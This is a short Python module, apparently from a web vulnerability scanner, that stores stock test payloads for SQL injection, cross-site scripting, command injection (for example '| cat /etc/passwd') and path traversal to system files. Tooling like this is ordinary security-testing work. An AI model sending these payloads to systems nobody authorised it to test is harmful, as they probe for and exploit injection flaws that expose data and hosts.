from collections import defaultdict


class PayloadManager:
    def __init__(self) -> None:
        self._payloads: dict[str, list[str]] = defaultdict(list)
        self._seed_defaults()

    def _seed_defaults(self) -> None:
        self._payloads["sqli"] = [
            "' OR '1'='1",
            "' OR 1=1--",
            "admin'--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL--",
            "1 AND SLEEP(5)",
            "1 OR SLEEP(5)--",
            "1; WAITFOR DELAY '0:0:5'--",
        ]
        self._payloads["xss"] = [
            "<script>alert(1)</script>",
            "\"><img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "'><svg onload=alert(1)>",
            "<body onload=alert(1)>",
        ]
        self._payloads["command"] = [
            "; id",
            "&& whoami",
            "| cat /etc/passwd",
            "$(id)",
        ]
        self._payloads["path_traversal"] = [
            "../../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "..%2f..%2f..%2f..%2fetc%2fpasswd",
        ]

    def add_payload(self, category: str, payload: str) -> None:
        self._payloads[category].append(payload)

    def get_payloads(self, category: str) -> list[str]:
        return self._payloads.get(category, [])


payload_manager = PayloadManager()
